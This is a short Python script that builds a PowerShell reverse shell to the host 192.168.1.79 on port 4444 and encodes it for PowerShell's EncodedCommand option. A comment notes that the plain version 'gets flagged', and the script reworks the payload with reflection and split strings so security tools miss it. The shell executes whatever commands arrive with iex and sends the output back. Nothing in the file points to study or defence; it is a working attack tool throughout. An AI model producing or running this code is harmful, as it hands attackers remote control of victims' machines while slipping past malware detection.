import base64

cmd = """
$client = New-Object System.Net.Sockets.TCPClient('192.168.1.79',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
"""
# Above is the RAMP default, which we know gets flagged if not encoded.
# Let's heavily obfuscate it.
cmd = """
$a=[System.Reflection.Assembly]::LoadWithPartialName('System');
$t=$a.GetType('System.Net.Sockets.TcpClient');
$c=[Activator]::CreateInstance($t, '192.168.1.79', 4444);
$s=$c.GetStream();
[byte[]]$b=0..65535|%{0};
while(($i=$s.Read($b,0,$b.Length)) -ne 0){
  $d=(New-Object -TypeName ('Text.ASC' + 'IIEncoding')).GetString($b,0,$i);
  $o=(iex $d 2>&1|Out-String);
  $o=$o+'PS '+(pwd).Path+'> ';
  $sb=([text.encoding]::ASCII).GetBytes($o);
  $s.Write($sb,0,$sb.Length);
  $s.Flush();
}
$c.Close();
""".replace('\n', '')

# Encode payload
b64 = base64.b64encode(cmd.encode('utf-16le')).decode()


print("Payload string:")
print(cmd)
print("\nEncodedCommand:")
print(b64)
